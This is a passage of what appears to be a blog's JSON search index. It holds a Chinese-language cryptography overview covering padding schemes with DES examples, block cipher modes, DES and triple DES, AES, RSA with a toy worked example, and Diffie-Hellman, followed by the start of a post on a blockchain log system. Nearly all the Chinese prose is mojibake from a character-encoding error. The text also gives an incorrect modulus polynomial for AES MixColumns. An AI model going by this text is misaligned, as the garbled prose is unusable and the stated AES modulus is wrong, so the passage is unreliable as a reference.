ç›®å‰ä¹Ÿå·²ç»æœ‰äº†ä¸å°‘çš„è§„å®šã€‚ å¸¸è§çš„ å¡«å……è§„åˆ™ å¦‚ä¸‹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå³ä½¿æ¶ˆæ¯çš„é•¿åº¦æ˜¯å—å¤§å°çš„æ•´æ•°å€ï¼Œä»ç„¶éœ€è¦å¡«å……ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœåœ¨è§£å¯†ä¹‹åå‘ç° Padding ä¸æ­£ç¡®ï¼Œåˆ™å¾€å¾€ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚æˆ‘ä»¬ä¹Ÿå› æ­¤å¯ä»¥çŸ¥é“ Paddig æ˜¯å¦æ­£ç¡®ã€‚ Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6F 72 05 05 05 05 05KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40 Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6F 72 80 00 00 00 00KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40 è¿™é‡Œå…¶å®å°±æ˜¯å’Œ md5 å’Œ sha1 çš„ padding å·®ä¸å¤šã€‚ Pad with zeroes except make the last byte equal to the number of padding bytes1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6f 72 00 00 00 00 05KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8 Pad with zero (null) characters1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6f 72 00 00 00 00 00KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75 Pad with spaces1234DES INPUT BLOCK = f o r _ _ _ _ _(IN HEX) 66 6f 72 20 20 20 20 20KEY = 01 23 45 67 89 AB CD EFDES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25 å·¥ä½œæ¨¡å¼åˆ†ç»„å¯†ç çš„å·¥ä½œæ¨¡å¼æ˜¯ï¼šæ ¹æ®ä¸åŒçš„æ•°æ®æ ¼å¼å’Œå®‰å…¨æ€§è¦æ±‚, ä»¥ä¸€ä¸ªå…·ä½“çš„åˆ†ç»„å¯†ç ç®—æ³•ä¸ºåŸºç¡€æ„é€ ä¸€ä¸ªåˆ†ç»„å¯†ç ç³»ç»Ÿçš„æ–¹æ³•ã€‚åˆ†ç»„å¯†ç çš„å·¥ä½œæ¨¡å¼åº”å½“åŠ›æ±‚ç®€å•, æœ‰æ•ˆå’Œæ˜“äºå®ç°ï¼Œéœ€è¦é‡‡ç”¨é€‚å½“çš„å·¥ä½œæ¨¡å¼æ¥éšè”½æ˜æ–‡çš„ç»Ÿè®¡ç‰¹æ€§ã€æ•°æ®çš„æ ¼å¼ç­‰ï¼Œé™ä½åˆ é™¤ã€é‡æ”¾ã€æ’å…¥å’Œä¼ªé€ æˆåŠŸçš„æœºä¼šã€‚ åˆ†ç»„å¯†ç çš„ä¸»è¦å·¥ä½œæ¨¡å¼ï¼š ç”µç æœ¬(ECB)æ¨¡å¼ å¯†ç åˆ†ç»„é“¾æ¥(CBC)æ¨¡å¼ å¯†ç åé¦ˆ(CFB)æ¨¡å¼ è¾“å‡ºåé¦ˆ(OFB)æ¨¡å¼ è®¡æ•°å™¨(CTR)æ¨¡å¼ åŸºæœ¬ç­–ç•¥åœ¨åˆ†ç»„å¯†ç è®¾è®¡æ—¶ï¼Œå……åˆ†ä½¿ç”¨äº† Shannon æå‡ºçš„ä¸¤å¤§ç­–ç•¥ï¼šæ··æ·†ä¸æ‰©æ•£ä¸¤å¤§ç­–ç•¥ã€‚ æ··æ·†æ··æ·†ï¼ŒConfusionï¼Œå°†å¯†æ–‡ä¸å¯†é’¥ä¹‹é—´çš„ç»Ÿè®¡å…³ç³»å˜å¾—å°½å¯èƒ½å¤æ‚ï¼Œä½¿å¾—æ”»å‡»è€…å³ä½¿è·å–äº†å¯†æ–‡çš„ä¸€äº›ç»Ÿè®¡ç‰¹æ€§ï¼Œä¹Ÿæ— æ³•æ¨æµ‹å¯†é’¥ã€‚ä¸€èˆ¬ä½¿ç”¨å¤æ‚çš„éçº¿æ€§å˜æ¢å¯ä»¥å¾—åˆ°å¾ˆå¥½çš„æ··æ·†æ•ˆæœï¼Œå¸¸è§çš„æ–¹æ³•å¦‚ä¸‹ S ç›’ ä¹˜æ³• æ‰©æ•£æ‰©æ•£ï¼ŒDiffusionï¼Œä½¿å¾—æ˜æ–‡ä¸­çš„æ¯ä¸€ä½å½±å“å¯†æ–‡ä¸­çš„è®¸å¤šä½ã€‚å¸¸è§çš„æ–¹æ³•æœ‰ çº¿æ€§å˜æ¢ ç½®æ¢ ç§»ä½ï¼Œå¾ªç¯ç§»ä½ å¸¸è§åŠ è§£å¯†ç»“æ„ç›®å‰å—åŠ å¯†ä¸­ä¸»è¦ä½¿ç”¨çš„æ˜¯ç»“æ„æ˜¯ è¿­ä»£ç»“æ„ï¼Œè¿™æ˜¯å› ä¸ºè¿­ä»£ç»“æ„ä¾¿äºè®¾è®¡ä¸å®ç°ï¼ŒåŒæ—¶æ–¹ä¾¿å®‰å…¨æ€§è¯„ä¼°ã€‚ è¿­ä»£ç»“æ„æ¦‚è¿°è¿­ä»£ç»“æ„åŸºæœ¬å¦‚ä¸‹ï¼Œä¸€èˆ¬åŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ† å¯†é’¥ç½®æ¢ è½®åŠ å¯†å‡½æ•° è½®è§£å¯†å‡½æ•° è½®å‡½æ•°ç›®å‰æ¥è¯´ï¼Œè½®å‡½æ•°ä¸»è¦æœ‰ä¸»è¦æœ‰ä»¥ä¸‹è®¾è®¡æ–¹æ³• Feistel Networkï¼Œç”± Horst Feistel å‘æ˜ï¼ŒDES è®¾è®¡è€…ä¹‹ä¸€ã€‚ DES Substitution-Permutation Network(SPN) AES å…¶ä»–æ–¹æ¡ˆ å¯†é’¥æ‰©å±•ç›®å‰ï¼Œå¯†é’¥æ‰©å±•çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæ²¡æœ‰è§åˆ°ä»€ä¹ˆå®Œç¾çš„å¯†é’¥æ‰©å±•æ–¹æ³•ï¼ŒåŸºæœ¬åŸåˆ™æ˜¯ä½¿å¾—å¯†é’¥çš„æ¯ä¸€ä¸ªæ¯”ç‰¹å°½å¯èƒ½å½±å“å¤šè½®çš„è½®å¯†é’¥ã€‚ DESåŸºæœ¬ä»‹ç»Data Encryption Standard(DES)ï¼Œæ•°æ®åŠ å¯†æ ‡å‡†ï¼Œæ˜¯å…¸å‹çš„å—åŠ å¯†ï¼Œå…¶åŸºæœ¬ä¿¡æ¯å¦‚ä¸‹ è¾“å…¥ 64 ä½ã€‚ è¾“å‡º 64 ä½ã€‚ å¯†é’¥ 64 ä½ï¼Œä½¿ç”¨ 64 ä½å¯†é’¥ä¸­çš„ 56 ä½ï¼Œå‰©ä½™çš„ 8 ä½è¦ä¹ˆä¸¢å¼ƒï¼Œè¦ä¹ˆä½œä¸ºå¥‡å¶æ ¡éªŒä½ã€‚ Feistel è¿­ä»£ç»“æ„ æ˜æ–‡ç»è¿‡ 16 è½®è¿­ä»£å¾—åˆ°å¯†æ–‡ã€‚ å¯†æ–‡ç»è¿‡ç±»ä¼¼çš„ 16 è½®è¿­ä»£å¾—åˆ°æ˜æ–‡ã€‚ åŸºæœ¬æµç¨‹ç»™å‡ºä¸€å¼ ç®€å•çš„ DES æµç¨‹å›¾ã€‚ åŠ å¯†æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¸€ä¸‹æ¯ä¸€è½®çš„åŠ å¯†è¿‡ç¨‹ $L_{i+1}=R_i$ $R_{i+1}=L_i\\oplus F(R_i,K_i)$ é‚£ä¹ˆåœ¨æœ€åçš„ Permutation ä¹‹å‰ï¼Œå¯¹åº”çš„å¯†æ–‡ä¸º$(R_{n+1},L_{n+1})$ã€‚ è§£å¯†é‚£ä¹ˆè§£å¯†å¦‚ä½•è§£å¯†å‘¢ï¼Ÿé¦–å…ˆæˆ‘ä»¬å¯ä»¥æŠŠå¯†æ–‡å…ˆè¿›è¡Œé€†ç½®æ¢ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°æœ€åä¸€è½®çš„è¾“å‡ºã€‚æˆ‘ä»¬è¿™æ—¶è€ƒè™‘æ¯ä¸€è½® $R_i=L_{i+1}$ $L_i=R_{i+1}\\oplus F(L_{i+1},K_i)$ å› æ­¤ï¼Œ$(L_0,R_0)$ å°±æ˜¯åŠ å¯†æ—¶ç¬¬ä¸€æ¬¡ç½®æ¢åçš„æ˜æ–‡ã€‚æˆ‘ä»¬åªéœ€è¦å†æ‰§è¡Œé€†ç½®æ¢å°±å¯ä»¥è·å¾—æ˜æ–‡äº†ã€‚ å¯ä»¥çœ‹å‡ºï¼ŒDES åŠ è§£å¯†ä½¿ç”¨åŒä¸€å¥—é€»è¾‘ï¼Œåªæ˜¯å¯†é’¥ä½¿ç”¨çš„é¡ºåºä¸ä¸€è‡´ã€‚ æ ¸å¿ƒéƒ¨ä»¶DES ä¸­çš„æ ¸å¿ƒéƒ¨ä»¶ä¸»è¦åŒ…æ‹¬ï¼ˆè¿™é‡Œåªç»™å‡ºåŠ å¯†è¿‡ç¨‹çš„ï¼‰ åˆå§‹ç½®æ¢ F å‡½æ•° E æ‰©å±•å‡½æ•° S ç›’ï¼Œè®¾è®¡æ ‡å‡†æœªç»™å‡ºã€‚ P ç½®æ¢ æœ€åç½®æ¢ å…¶ä¸­ F å‡½æ•°å¦‚ä¸‹ å¦‚æœå¯¹ DES æ›´åŠ æ„Ÿå…´è¶£ï¼Œå¯ä»¥è¿›è¡Œæ›´åŠ ä»”ç»†åœ°ç ”ç©¶ã€‚æ¬¢è¿æä¾› PRã€‚ è¡ç”Ÿåœ¨ DES çš„åŸºç¡€ä¸Šï¼Œè¡ç”Ÿäº†ä»¥ä¸‹ä¸¤ç§åŠ å¯†æ–¹å¼ åŒé‡ DES ä¸‰ç§ DES åŒé‡ DESåŒé‡ DES ä½¿ç”¨ä¸¤ä¸ªå¯†é’¥ï¼Œé•¿åº¦ä¸º 112 æ¯”ç‰¹ã€‚åŠ å¯†æ–¹å¼å¦‚ä¸‹ $C=E_{k2}(E_{k1}(P))$ ä½†æ˜¯åŒé‡ DES ä¸èƒ½æŠµæŠ—ä¸­é—´ç›¸é‡æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹ä¸¤ä¸ªé›†åˆ $I={E_{k1}(P)}$ $J=D_{k2}(C)$ å³åˆ†åˆ«æšä¸¾ K1 å’Œ K2 åˆ†åˆ«å¯¹ P è¿›è¡ŒåŠ å¯†å’Œå¯¹ C è¿›è¡Œè§£å¯†ã€‚ åœ¨æˆ‘ä»¬å¯¹ P è¿›è¡ŒåŠ å¯†å®Œæ¯•åï¼Œå¯ä»¥å¯¹åŠ å¯†ç»“æœè¿›è¡Œæ’åºï¼Œè¿™æ ·çš„å¤æ‚åº¦ä¸º$2^nlog(2^n)=O(n2^n)$ å½“æˆ‘ä»¬å¯¹ C è¿›è¡Œè§£å¯†æ—¶ï¼Œå¯ä»¥æ¯è§£å¯†ä¸€ä¸ªï¼Œå°±å»å¯¹åº”çš„è¡¨ä¸­æŸ¥è¯¢ã€‚ æ€»çš„å¤æ‚åº¦ä¸ºè¿˜æ˜¯$O(n2^n)$ã€‚ ä¸‰é‡ DESä¸‰é‡ DES çš„åŠ è§£å¯†æ–¹å¼å¦‚ä¸‹ $C=E_{k3}(D_{k2}(E_{k1}(P)))$ $P=D_{k1}(E_{k2}(D_{k3}(C)))$ åœ¨é€‰æ‹©å¯†é’¥æ—¶ï¼Œå¯ä»¥æœ‰ä¸¤ç§æ–¹æ³• 3 ä¸ªä¸åŒçš„å¯†é’¥ï¼Œk1ï¼Œk2ï¼Œk3 äº’ç›¸ç‹¬ç«‹ï¼Œä¸€å…± 168 æ¯”ç‰¹ã€‚ 2 ä¸ªä¸åŒçš„å¯†é’¥ï¼Œk1 ä¸ k2 ç‹¬ç«‹ï¼Œk3=k1ï¼Œ112 æ¯”ç‰¹ã€‚ æ”»å‡»æ–¹æ³• å·®åˆ†æ”»å‡» çº¿æ€§æ”»å‡» AESåŸºæœ¬ä»‹ç»Advanced Encryption Standardï¼ˆAESï¼‰ï¼Œé«˜çº§åŠ å¯†æ ‡å‡†ï¼Œæ˜¯å…¸å‹çš„å—åŠ å¯†ï¼Œè¢«è®¾è®¡æ¥å–ä»£ DESï¼Œç”± Joan Daemen å’Œ Vincent Rijmen æ‰€è®¾è®¡ã€‚å…¶åŸºæœ¬ä¿¡æ¯å¦‚ä¸‹ è¾“å…¥ï¼š128 æ¯”ç‰¹ã€‚ è¾“å‡ºï¼š128 æ¯”ç‰¹ã€‚ SPN ç½‘ç»œç»“æ„ã€‚ å…¶è¿­ä»£è½®æ•°ä¸å¯†é’¥é•¿åº¦æœ‰å…³ç³»ï¼Œå¦‚ä¸‹ å¯†é’¥é•¿åº¦ï¼ˆæ¯”ç‰¹ï¼‰ è¿­ä»£è½®æ•° 128 10 192 12 256 14 åŸºæœ¬æµç¨‹åŸºæœ¬æ¦‚å¿µåœ¨ AES åŠ è§£å¯†è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€å—éƒ½æ˜¯ 128 æ¯”ç‰¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œæ˜ç¡®ä¸€äº›åŸºæœ¬æ¦‚å¿µã€‚ åœ¨ AES ä¸­ï¼Œå—ä¸ State ä¹‹é—´çš„è½¬æ¢è¿‡ç¨‹å¦‚ä¸‹ æ‰€ä»¥ï¼Œå¯ä»¥çœ‹å‡ºï¼Œæ¯ä¸€ä¸ª block ä¸­çš„å­—èŠ‚æ˜¯æŒ‰ç…§åˆ—æ’åˆ—è¿›å…¥åˆ°çŠ¶æ€æ•°ç»„çš„ã€‚ è€Œå¯¹äºæ˜æ–‡æ¥è¯´ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šé€‰æ‹©ä½¿ç”¨å…¶åå…­è¿›åˆ¶è¿›è¡Œç¼–ç ã€‚ åŠ è§£å¯†è¿‡ç¨‹è¿™é‡Œç»™ä¸ªçœ‹é›ªä¸Šæ¯”è¾ƒå¥½çš„ å›¾ä¾‹ ï¼Œä»¥ä¾¿äºä»‹ç»åŸºæœ¬çš„æµç¨‹ï¼Œæ¯ä¸€è½®ä¸»è¦åŒ…æ‹¬ è½®å¯†é’¥åŠ ï¼ŒAddRoundKey å­—èŠ‚æ›¿æ¢ï¼ŒSubBytes è¡Œç§»ä½ï¼ŒShiftRows åˆ—æ··æ·†ï¼ŒMixColumns ä¸Šé¢çš„åˆ—æ··æ·†çš„çŸ©é˜µä¹˜æ³•ç­‰å·å·¦è¾¹çš„åˆ—å‘é‡åº”è¯¥åœ¨å³è¾¹ã€‚ è¿™é‡Œå†ç»™ä¸€å¼ å…¶åŠ è§£å¯†çš„å…¨å›¾ï¼Œå…¶è§£å¯†ç®—æ³•çš„æ­£ç¡®æ€§å¾ˆæ˜¾ç„¶ã€‚ æˆ‘ä»¬è¿™é‡Œé‡ç‚¹å…³æ³¨ä¸€ä¸‹ä»¥ä¸‹ã€‚ å­—èŠ‚æ›¿æ¢åœ¨å­—èŠ‚æ›¿æ¢çš„èƒŒåï¼Œå…¶å®æ˜¯æœ‰å¯¹åº”çš„æ•°å­¦è§„åˆ™æ¥å®šä¹‰å¯¹åº”çš„æ›¿æ¢è¡¨çš„ï¼Œå¦‚ä¸‹ è¿™é‡Œçš„è¿ç®—å‡å®šä¹‰åœ¨ $GF(2^8)$ å†…ã€‚ åˆ—æ··æ·†è¿™é‡Œçš„è¿ç®—ä¹Ÿæ˜¯å®šä¹‰åœ¨ $GF(2^8)$ ä¸Šï¼Œä½¿ç”¨çš„æ¨¡å¤šé¡¹å¼ä¸º $x^8+x^4+x^3+1$ã€‚ å¯†é’¥æ‰©å±• ç­‰ä»·è§£å¯†ç®—æ³•ç®€å•åˆ†æä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° äº¤æ¢é€†å‘è¡Œç§»ä½å’Œé€†å‘å­—èŠ‚ä»£æ›¿å¹¶ä¸å½±å“ç»“æœã€‚ äº¤æ¢è½®å¯†é’¥åŠ å’Œé€†å‘åˆ—æ··æ·†å¹¶ä¸å½±å“ç»“æœï¼Œå…³é”®åœ¨äº é¦–å…ˆå¯ä»¥æŠŠå¼‚æˆ–çœ‹æˆåŸŸä¸Šçš„å¤šé¡¹å¼åŠ æ³• ç„¶åå¤šé¡¹å¼ä¸­ä¹˜æ³•å¯¹åŠ æ³•å…·æœ‰åˆ†é…ç‡ã€‚ æ”»å‡»æ–¹æ³• ç§¯åˆ†æ”»å‡» éå¯¹ç§°åŠ å¯†ä»‹ç»åœ¨éå¯¹ç§°å¯†ç ä¸­ï¼ŒåŠ å¯†è€…ä¸è§£å¯†è€…æ‰€ä½¿ç”¨çš„å¯†é’¥å¹¶ä¸ä¸€æ ·ï¼Œå…¸å‹çš„æœ‰ RSA åŠ å¯†ï¼ŒèƒŒåŒ…åŠ å¯†ï¼Œæ¤­åœ†æ›²çº¿åŠ å¯†ã€‚ RSARSA åŠ å¯†ç®—æ³•æ˜¯ä¸€ç§éå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚åœ¨å…¬å¼€å¯†é’¥åŠ å¯†å’Œç”µå­å•†ä¸šä¸­ RSA è¢«å¹¿æ³›ä½¿ç”¨ã€‚RSA æ˜¯ 1977 å¹´ç”±ç½—çº³å¾·Â·æç»´æ–¯ç‰¹ï¼ˆRon Rivestï¼‰ã€é˜¿è¿ªÂ·è¨è«å°”ï¼ˆAdi Shamirï¼‰å’Œä¼¦çº³å¾·Â·é˜¿å¾·æ›¼ï¼ˆLeonard Adlemanï¼‰ä¸€èµ·æå‡ºçš„ã€‚RSA å°±æ˜¯ä»–ä»¬ä¸‰äººå§“æ°å¼€å¤´å­—æ¯æ‹¼åœ¨ä¸€èµ·ç»„æˆçš„ã€‚ RSA ç®—æ³•çš„å¯é æ€§ç”±æå¤§æ•´æ•°å› æ•°åˆ†è§£çš„éš¾åº¦å†³å®šã€‚æ¢è¨€ä¹‹ï¼Œå¯¹ä¸€æå¤§æ•´æ•°åšå› æ•°åˆ†è§£æ„ˆå›°éš¾ï¼ŒRSA ç®—æ³•æ„ˆå¯é ã€‚å‡å¦‚æœ‰äººæ‰¾åˆ°ä¸€ç§å¿«é€Ÿå› æ•°åˆ†è§£çš„ç®—æ³•çš„è¯ï¼Œé‚£ä¹ˆç”¨ RSA åŠ å¯†çš„ä¿¡æ¯çš„å¯é æ€§å°±è‚¯å®šä¼šæåº¦ä¸‹é™ã€‚ä½†æ‰¾åˆ°è¿™æ ·çš„ç®—æ³•çš„å¯èƒ½æ€§æ˜¯éå¸¸å°çš„ã€‚å¦‚ä»Šï¼Œåªæœ‰çŸ­çš„ RSA å¯†é’¥æ‰å¯èƒ½è¢«å¼ºåŠ›æ–¹å¼è§£ç ´ã€‚åˆ° 2020 å¹´ä¸ºæ­¢ï¼Œè¿˜æ²¡æœ‰ä»»ä½•å¯é çš„æ”»å‡» RSA ç®—æ³•çš„æ–¹å¼ã€‚ åŸºæœ¬åŸç†å…¬é’¥ä¸ç§é’¥çš„äº§ç”Ÿ éšæœºé€‰æ‹©ä¸¤ä¸ªä¸åŒå¤§è´¨æ•° $p$ å’Œ $q$ï¼Œè®¡ç®— $N = p \\times q$ æ ¹æ®æ¬§æ‹‰å‡½æ•°ï¼Œæ±‚å¾— $\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)$ é€‰æ‹©ä¸€ä¸ªå°äº $\\varphi (N)$ çš„æ•´æ•° $e$ï¼Œä½¿ $e$ å’Œ $\\varphi (N)$ äº’è´¨ã€‚å¹¶æ±‚å¾— $e$ å…³äº $\\varphi (N)$ çš„æ¨¡åå…ƒç´ ï¼Œå‘½åä¸º $d$ï¼Œæœ‰ $ed\\equiv 1 \\pmod {\\varphi (N)}$ å°† $pâ€‹$ å’Œ $qâ€‹$ çš„è®°å½•é”€æ¯ æ­¤æ—¶ï¼Œ$(N,e)$ æ˜¯å…¬é’¥ï¼Œ$(N,d)$ æ˜¯ç§é’¥ã€‚ æ¶ˆæ¯åŠ å¯†é¦–å…ˆéœ€è¦å°†æ¶ˆæ¯ ä»¥ä¸€ä¸ªåŒæ–¹çº¦å®šå¥½çš„æ ¼å¼è½¬åŒ–ä¸ºä¸€ä¸ªå°äº $N$ï¼Œä¸”ä¸ $N$ äº’è´¨çš„æ•´æ•° $m$ã€‚å¦‚æœæ¶ˆæ¯å¤ªé•¿ï¼Œå¯ä»¥å°†æ¶ˆæ¯åˆ†ä¸ºå‡ æ®µï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„å—åŠ å¯†ï¼Œåå¯¹äºæ¯ä¸€éƒ¨åˆ†åˆ©ç”¨å¦‚ä¸‹å…¬å¼åŠ å¯†ï¼š $$m^{e}\\equiv c\\pmod N$$ æ¶ˆæ¯è§£å¯†åˆ©ç”¨å¯†é’¥ $dâ€‹$ è¿›è¡Œè§£å¯†ã€‚ $$c^{d}\\equiv m\\pmod N$$ æ­£ç¡®æ€§è¯æ˜å³æˆ‘ä»¬è¦è¯$m^{ed} \\equiv m \\bmod N$ï¼Œå·²çŸ¥$ed \\equiv 1 \\bmod \\phi(N)$ï¼Œé‚£ä¹ˆ $ed=k\\phi(N)+1$ï¼Œå³éœ€è¦è¯æ˜ $$m^{k\\phi(N)+1} \\equiv m \\bmod N$$ è¿™é‡Œæˆ‘ä»¬åˆ†ä¸¤ç§æƒ…å†µè¯æ˜ ç¬¬ä¸€ç§æƒ…å†µ $gcd(m,N)=1â€‹$ï¼Œé‚£ä¹ˆ $m^{\\phi(N)} \\equiv 1 \\bmod Nâ€‹$ï¼Œå› æ­¤åŸå¼æˆç«‹ã€‚ ç¬¬äºŒç§æƒ…å†µ $gcd(m,N)\\neq 1$ï¼Œé‚£ä¹ˆ $m$ å¿…ç„¶æ˜¯ $p$ æˆ–è€… $q$ çš„å€æ•°ï¼Œå¹¶ä¸” $n=m$ å°äº $N$ã€‚æˆ‘ä»¬å‡è®¾ $$m=xp$$ é‚£ä¹ˆ $x$ å¿…ç„¶å°äº $q$ï¼Œåˆç”±äº $q$ æ˜¯ç´ æ•°ã€‚é‚£ä¹ˆ $$m^{\\phi(q)} \\equiv 1 \\bmod q$$ è¿›è€Œ $$m^{k\\phi(N)}=m^{k(p-1)(q-1)}=(m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q$$ é‚£ä¹ˆ $$m^{k\\phi(N)+1}=m+uqm$$ è¿›è€Œ $$m^{k\\phi(N)+1}=m+uqxp=m+uxN$$ æ‰€ä»¥åŸå¼æˆç«‹ã€‚ æ ·ä¾‹ä¾‹1è®¡ç®—å…¬é’¥å’Œç§é’¥ p = 13 , q = 5 N = pq = 65 r = (p-1)(q-1) = (13-1)(5-1) = 48 è®¡ç®—æ¨¡åå…ƒç´ r=48ï¼Œé€‰æ‹©e=5ï¼Œå¾—åˆ°äºŒå…ƒä¸€æ¬¡æ–¹ç¨‹ï¼š5d-48k=1 , è·å¾—ä¸€ç»„è§£ï¼šd=29ï¼Œk=3 å› æ­¤ï¼Œå…¬é’¥æ˜¯ (N, e) = (65, 5)ï¼Œç§é’¥æ˜¯ (N, d) = (65, 29)ã€‚ åŠ å¯†ä¿¡æ¯ æ˜æ–‡ï¼šm=3 è®¡ç®—: $ c \\equiv 3^{5} \\pmod 65 \\equiv 48 $ å› æ­¤ï¼š3è¢«åŠ å¯†ä¸º48 è§£å¯†ä¿¡æ¯ å¯†æ–‡ï¼šc=48 è®¡ç®—ï¼š$ n \\equiv 48^{29} \\pmod 65 \\equiv 3 $ å› æ­¤ï¼š48è¢«è§£å¯†ä¸º3 ä¾‹2 å¯†ç åè®®Diffie-Hellman å¯†é’¥äº¤æ¢ å¯†é’¥äº¤æ¢æ˜¯å®ç°å®‰å…¨é€šä¿¡çš„åŸºç¡€ å•†ç”¨åŠ å¯†ç®—æ³•AESå’ŒDESéœ€è¦åœ¨å®‰å…¨é€šä¿¡ä¹‹å‰ï¼Œå®ç°é€šä¿¡åŒæ–¹çš„å¯†é’¥å…±äº«ã€‚ å¯†é’¥äº¤æ¢çš„æ–¹æ³•ï¼š åŸºäºRSAçš„å¯†é’¥äº¤æ¢ï¼› åŸºäºKDCæŠ€æœ¯ (Key Distributed Centerï¼Œå¯†é’¥åˆ†å‘ä¸­å¿ƒ)ï¼› Diffie-Hellmanå¯†é’¥äº¤æ¢ï¼ˆç®€ç§°ï¼šDHç®—æ³•ï¼‰ï¼› åŸºäºç‰©ç†å±‚çš„å¯†é’¥äº¤æ¢ã€‚ DHç®—æ³•æ˜¯ä¸å®‰å…¨ä¿¡é“ä¸‹å®ç°å®‰å…¨å¯†é’¥å…±äº«çš„ä¸€ç§æ–¹æ³•ï¼Œç”± W. Diffie å’Œ M.Hellman åœ¨1976å¹´æå‡ºçš„ç¬¬ä¸€ä¸ªå…¬å¼€çš„å…¬é’¥å¯†ç ç®—æ³•ã€‚ DHåè®®æ¡ˆä¾‹ å‚è€ƒhttps://github.com/Mundi-Xu/cipher_web_rocket â†©ctf-wiki â†©æ·±å…¥æµ…å‡ºå¯†ç å­¦â€”â€”å¸¸ç”¨åŠ å¯†æŠ€æœ¯åŸç†ä¸åº”ç”¨ â†©","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://mundi-xu.github.io/tags/crypto/"},{"name":"rsa","slug":"rsa","permalink":"https://mundi-xu.github.io/tags/rsa/"},{"name":"rust","slug":"rust","permalink":"https://mundi-xu.github.io/tags/rust/"},{"name":"ä»¿å°„å¯†ç ","slug":"ä»¿å°„å¯†ç ","permalink":"https://mundi-xu.github.io/tags/%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/"},{"name":"æµå¯†ç ","slug":"æµå¯†ç ","permalink":"https://mundi-xu.github.io/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"},{"name":"åˆ†ç»„å¯†ç ","slug":"åˆ†ç»„å¯†ç ","permalink":"https://mundi-xu.github.io/tags/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/"},{"name":"å¯†ç åè®®","slug":"å¯†ç åè®®","permalink":"https://mundi-xu.github.io/tags/%E5%AF%86%E7%A0%81%E5%8D%8F%E8%AE%AE/"},{"name":"RC4","slug":"RC4","permalink":"https://mundi-xu.github.io/tags/RC4/"},{"name":"des","slug":"des","permalink":"https://mundi-xu.github.io/tags/des/"},{"name":"aes","slug":"aes","permalink":"https://mundi-xu.github.io/tags/aes/"}]},{"title":"åŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿ","slug":"åŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿ","date":"2020-07-01T11:00:00.000Z","updated":"2020-12-27T10:06:42.754Z","comments":true,"path":"2020/07/01/åŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿ/","link":"","permalink":"https://mundi-xu.github.io/2020/07/01/%E5%9F%BA%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F/","excerpt":"åŸºäºåŒºå—é“¾æŠ€æœ¯è®¾è®¡å¹¶å®ç°äº†å®‰å…¨æ—¥å¿—ç³»ç»Ÿï¼Œé‡‡ç”¨é“¾ä¸Šæ•°æ®å­˜å‚¨æ¨¡å¼ï¼Œå°†æœ¬åœ°æ—¥å¿—æå–å…³é”®å­—æ®µå¹¶ä¸Šä¼ è‡³åŒºå—é“¾ä¸­å­˜å‚¨ï¼ŒåŒæ—¶æä¾›å¯è§†åŒ–ç•Œé¢è®©ç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨æ—¥å¿—ç›¸å…³çš„å®‰å…¨åˆ†æåŠŸèƒ½ã€‚","text":"æ‘˜è¦ä¿¡æ¯ç³»ç»Ÿä¸­å­˜åœ¨ç€å¤§é‡çš„å®‰å…¨è®¾å¤‡æ—¥å¿—ï¼Œè¿™äº›æ—¥å¿—å¯¹ç³»ç»Ÿç›‘æ§ã€æŸ¥è¯¢ã€å®‰å…¨å®¡è®¡å’Œæ•…éšœè¯Šæ–­ç­‰éƒ½ååˆ†é‡è¦ã€‚ä¸æ­¤åŒæ—¶ï¼Œé»‘å®¢å…¥ä¾µç³»ç»Ÿæ—¶ï¼Œæ—¥å¿—ä¸ºé»‘å®¢çš„è¡Œä¸ºæä¾›äº†è¯æ®ã€‚å› æ­¤å¯¹å…¶è¿›è¡Œå®‰å…¨çš„å­˜å‚¨ä¸å¤„ç†å…·æœ‰é‡è¦æ„ä¹‰ã€‚åŒºå—é“¾æŠ€æœ¯çš„å‘å±•ï¼Œä¸ºå®ç°æ—¥å¿—ä¿¡æ¯çš„ä¿æŠ¤ã€åˆ†äº«ã€å–è¯ã€å¤šè¾¹åˆ©ç›Šæœ€å¤§åŒ–æä¾›äº†å¯èƒ½ï¼Œä¸ºå®ç°å®‰å…¨æ—¥å¿—ç³»ç»Ÿæä¾›äº†ä¿éšœã€‚ 